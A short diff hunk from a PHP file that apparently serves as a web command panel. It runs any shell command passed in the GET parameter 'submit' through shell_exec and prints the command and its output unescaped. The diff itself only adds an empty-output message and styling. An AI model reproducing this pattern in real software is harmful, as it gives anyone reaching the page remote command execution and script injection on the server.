@@ -212,7 +212,10 @@ if(isset($_GET['view'])){
         $command = $_GET['submit'];
 	if(isset($command)){
          $results = shell_exec("$command 2>&1");
-         echo "<table><tr class='relative'><th>Output of command:`".$command."`<button class='copyimage' style='right:40px' onclick='copyOutput(this);'>Copy</button></th></tr><tr><td><pre style='text-align:left'>$results</pre></td></tr></table>"; 
+         if(strlen($results) == 0) {
+          $results = "This command has no output.";
+         }
+         echo "<table style='min-width:70%;'><tr class='relative'><th>Output of command:`".$command."`<button class='copyimage' style='right:40px' onclick='copyOutput(this);'>Copy</button></th></tr><tr><td><pre style='text-align:left'>$results</pre></td></tr></table>"; 
       } else {
         header('WWW-Authenticate: Basic realm="My Realm"');
         header('HTTP/1.0 401 Unauthorized');
